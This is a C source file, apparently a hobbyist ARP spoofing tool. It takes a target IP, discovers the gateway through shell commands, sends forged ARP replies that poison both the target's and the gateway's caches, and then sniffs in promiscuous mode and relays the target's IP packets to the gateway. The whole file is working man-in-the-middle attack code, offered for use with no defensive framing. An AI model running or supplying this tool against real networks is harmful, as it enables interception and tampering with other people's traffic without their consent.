#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <libnet.h>
#include <pcap.h>
#include <stdint.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <sys/time.h>
#include <sys/types.h>
#include <string.h>

#define PROMISCUOUS 1
#define NONPROMISCUOUS 0
#define INTERFACE_NAME 30
#define ARP_REQUEST 1
#define ARP_REPLY 2
#define IP_ADDRESS 32
#define MAX_PACKET_SIZE 1024


//define Ethernet+ARP packet
#pragma pack(push,1)
typedef struct arp_packet{
uint8_t dest_mac[6];
uint8_t src_mac[6];
uint16_t ether_type;
uint16_t hwtype;
uint16_t ptype;
uint8_t hwsize;
uint8_t psize;
uint16_t opcode;
uint8_t sender_mac[6];
unsigned int sender_ip;
uint8_t target_mac[6];
unsigned int target_ip;
char padding[18];
}arp_p;


typedef struct arp_header_request{
uint16_t hwtype;
uint16_t ptype;
uint8_t hwsize;
uint8_t psize;
uint16_t opcode;
uint8_t sender_mac[6];
unsigned int sender_ip;
uint8_t target_mac[6];
unsigned int target_ip;
}arp_h_request;
#pragma pack(pop)

static int arp_fd,ip_fd,relay_fd;
static uint8_t my_mac[6];
static char gateway_ip_addr[IP_ADDRESS];
static char target_ip_addr[IP_ADDRESS];
static struct sockaddr_ll relay;
static struct sockaddr_in *ipv4;
static uint8_t gate_mac[6];
static struct ifreq ifr;

void spoil_target(arp_p *packet, struct sockaddr_ll *ll, char *ip)
{
	int val,i=0;
	packet->sender_ip=inet_addr(ip);
	packet->opcode=htons(ARP_REPLY);
	
if((val=sendto(arp_fd,(char*)packet,sizeof(arp_p),0,(struct sockaddr*)ll,sizeof(*ll)))<0)
{
		perror("attack error\n");
		exit (1);
}

packet->target_ip=inet_addr(target_ip_addr);
packet->sender_ip=inet_addr(gateway_ip_addr);

return;
}

void spoil_gateway(arp_p *packet, struct sockaddr_ll *ll,char tip[])
{
int val,i=0;
packet->sender_ip=inet_addr(tip);
packet->target_ip=inet_addr(gateway_ip_addr);

if((val=sendto(arp_fd,(char*)packet,sizeof(*packet),0,(struct sockaddr*)ll,sizeof(*ll)))<0)
{
perror("gateway attack error\n");
exit(1);
}
		packet->target_ip=inet_addr(gateway_ip_addr);
		packet->sender_ip=inet_addr(target_ip_addr);
return;
}


//Get my gateway IP address
void get_gateway(char gate[], char *gate_mac)
{

FILE *cmd;
unsigned char result[1024];
unsigned char result_mac[1024];
char buf[1024];
int i=0;
cmd = popen("route -n | grep UG | awk '{print $2}'", "r");
    if (cmd == NULL) {
        perror("popen");
        exit(EXIT_FAILURE);
	}
    if (fgets(result, sizeof(result), cmd)) {
	memcpy(gate,result,IP_ADDRESS);   
	}


printf("before:%s\n",gate);

gate[strlen(gate)-1]='\0';

sprintf(buf,"arp -a | grep %s | awk '{print $4}'",gate);
printf("%s",buf);
cmd=popen(buf,"r");
if(cmd==NULL)
{
perror("popen mac");
exit(EXIT_FAILURE);
}

if(fgets(result_mac,sizeof(result_mac),cmd))
{
sscanf(result_mac, "%x:%x:%x:%x:%x:%x", &gate_mac[0], &gate_mac[1], &gate_mac[2], &gate_mac[3], &gate_mac[4], &gate_mac[5]);
for(i=0;i<6;i++)
{
printf("%x  ",gate_mac[i]);
}

}

printf("gateway:%s",gate);
printf("\ngateway mac:");
for(i=0;i<6;i++)
printf("0x%2x ",gate_mac[i]);
}

//Checking packet whether it is kind of ARP

int check_arp(unsigned char **data,unsigned char *target,arp_p *p)
{
unsigned char *this;
int i=0;
struct libnet_ethernet_hdr *eth;

this=*data;

eth=(struct libnet_ethernet_hdr*)this;


if(ntohs(eth->ether_type)==0x0806) //If it is ARP
{

arp_h_request *new_arp;
uint8_t sender[6];
new_arp=(arp_h_request*)(this+sizeof(struct libnet_ethernet_hdr));
int i=0;

if((ntohs(new_arp->opcode)==ARP_REQUEST) && ((inet_addr(target))==new_arp->sender_ip))
	{
	for(i=0;i<6;i++)
	{p->dest_mac[i]=eth->ether_shost[i];
	p->target_mac[i]=eth->ether_shost[i];
	}
	printf("This is from our target\n");
	fflush(stdout);
	
	return 1;
	}
	else
	return 0;
}
else
	return -1;
}


//Checking sender's address and for relaying
int check_sender(unsigned char **data,unsigned char *target)
{

int i=0,val;
unsigned char *this;
this=*data;
struct libnet_ethernet_hdr *eth;
struct libnet_ipv4_hdr *ip;
eth=(struct libnet_ethernet_hdr*)this;

if(ntohs(eth->ether_type)==0x800)
{
	int i=0;
	int result;
	ip=(struct libnet_ipv4_hdr*)(this+sizeof(struct libnet_ethernet_hdr));
	
	if(ip->ip_src.s_addr==(inet_addr(target))){	
	
	printf("let's relay\n");fflush(stdout);
	return 1;
	}
	else
		return 0;
	
}
else
	return -1;
}	

void relay_packet(unsigned char **data,unsigned char *target)
{
int i=0,j=0,val;
unsigned char *this;
this=*data;
struct libnet_ethernet_hdr *eth;
struct libnet_ipv4_hdr *ip;
eth=(struct libnet_ethernet_hdr*)this;
ip=(struct libnet_ipv4_hdr*)(this+sizeof(struct libnet_ethernet_hdr));


memset(&relay,0,sizeof(struct sockaddr_ll));

	if((relay_fd=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL)))<0)
		{
		perror("socket error\n");
		fflush(stdout);
		exit (1);
		}



	relay.sll_family=htons(PF_PACKET);
	relay.sll_ifindex=ifr.ifr_ifindex;
	relay.sll_protocol=htons(ETH_P_ALL);

	for(i=0;i<6;i++)
		eth->ether_shost[i]=my_mac[i];
	
	for(i=0;i<6;i++){
		eth->ether_dhost[i]=gate_mac[i];
	}
	

	ip->ip_src.s_addr=(inet_addr(target));
	if((val=sendto(relay_fd,this,MAX_PACKET_SIZE,0,(struct sockaddr*)&relay,sizeof(relay)))<0)
		{
			perror("relay error");printf("%d\n",errno);
			exit(1);
		}

		close(relay_fd);	
		
return;
		

}



int main()
{

pcap_t *pcd;
arp_p packet;
int val,i=0;
char *interface;
unsigned long my_ip;
int res;
char errbuf[PCAP_ERRBUF_SIZE];
struct pcap_pkthdr *pkthdr;   // Packet information (timestamp,size...) 
struct sockaddr_in *target;
struct sockaddr_ll ll;
struct bpf_program fp;

//Enter target IP
printf("Enter your target IP:");
fgets(target_ip_addr,IP_ADDRESS,stdin);

//Get my interface name
interface=pcap_lookupdev(errbuf);

printf("Interface : %s\n",interface);

for(i=0;interface[i]!=0;i++)
{
	ifr.ifr_ifrn.ifrn_name[i]=interface[i];
}

ifr.ifr_ifrn.ifrn_name[i]=0;

//raw socket
if((ip_fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0)
{
    perror ("socket() failed to get socket descriptor for using ioctl() ");
	return -1;
}

//Get my IP address
if((val=ioctl(ip_fd,SIOCGIFADDR,&ifr,sizeof(ifr)))<0)
{
perror("Fail to get my ip address");
exit(1);
}

ipv4=(struct sockaddr_in *)&ifr.ifr_addr;
my_ip=ntohl(ipv4->sin_addr.s_addr);

//Get my MAC address
if((val=ioctl(ip_fd,SIOCGIFHWADDR,&ifr,sizeof(ifr)))<0)
{
printf("Fail to get my MAC address");
exit(1);
}

memcpy(my_mac,ifr.ifr_ifru.ifru_hwaddr.sa_data,6*sizeof(char));


printf("My Mac Address:");

for(i=0;i<6;i++)
	printf("0x%x ",my_mac[i]);

printf("My IP Address: 0x%x",(unsigned int)my_ip);

for(i=0;i<6;i++)
{
	packet.src_mac[i]=my_mac[i];
	packet.sender_mac[i]=my_mac[i];
}

//initialize packet
packet.ether_type=htons(0x0806);
packet.hwtype=htons(0x0001);
packet.ptype=htons(0x0800);
packet.hwsize=6;
packet.psize=4;
packet.opcode=htons(ARP_REPLY);

if(val=ioctl(ip_fd,SIOCGIFINDEX,&ifr,sizeof(ifr))<0)
{
	perror("Index error");
	exit (1);
}

if((arp_fd=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ARP)))<0)
{
	perror("ARP socket error");
	exit (1);
}


get_gateway(gateway_ip_addr,gate_mac);

printf("gateway:%s",gateway_ip_addr);
printf("\ntarget:%s",target_ip_addr);
printf("\n0x%x",inet_addr(target_ip_addr));

for(i=0;i<6;i++)
	packet.dest_mac[i]=0xff;

memset(&ll,0,sizeof(struct sockaddr_ll));

ll.sll_family=PF_PACKET;
ll.sll_ifindex=ifr.ifr_ifindex;
ll.sll_protocol=htons(ETH_P_ARP);

packet.sender_ip=inet_addr(gateway_ip_addr);
packet.target_ip=inet_addr(target_ip_addr);

//Attack target & gateway
spoil_target(&packet,&ll,gateway_ip_addr);
spoil_gateway(&packet,&ll,target_ip_addr);
pcd=pcap_open_live(interface,BUFSIZ,PROMISCUOUS,-1,errbuf);

if(pcd==NULL)
{
printf("%s\n",errbuf);
exit(1);
}

while(1)
{

unsigned char *pkt_data;

//reading packet
res=pcap_next_ex(pcd,&pkthdr,(const unsigned char**)&pkt_data);

if(res==0) 
	continue;
else if(res==-1) 
	return -1;
else 
{
	int x=0,y=0,z=0;
	
	if((x=check_arp(&pkt_data,target_ip_addr,&packet))>0)
	{	
		for(i=0;i<6;i++)
		{
		packet.sender_mac[i]=my_mac[i];
		packet.src_mac[i]=my_mac[i];
		}
		spoil_target(&packet,&ll,gateway_ip_addr);
		}
	else if(x<=0 && ((z=check_arp(&pkt_data,gateway_ip_addr,&packet))>0))
	{
		for(i=0;i<6;i++)
	{
		packet.sender_mac[i]=my_mac[i];
		packet.src_mac[i]=my_mac[i];
	}
		spoil_gateway(&packet,&ll,target_ip_addr);

	}
	else if((x<=0) &&(z<=0) && ((y=check_sender(&pkt_data,target_ip_addr))>0))
	{
		relay_packet(&pkt_data,target_ip_addr);
		printf("relay complete\n");	
	}
	else
		continue;
	
	}


}
return 0;

}



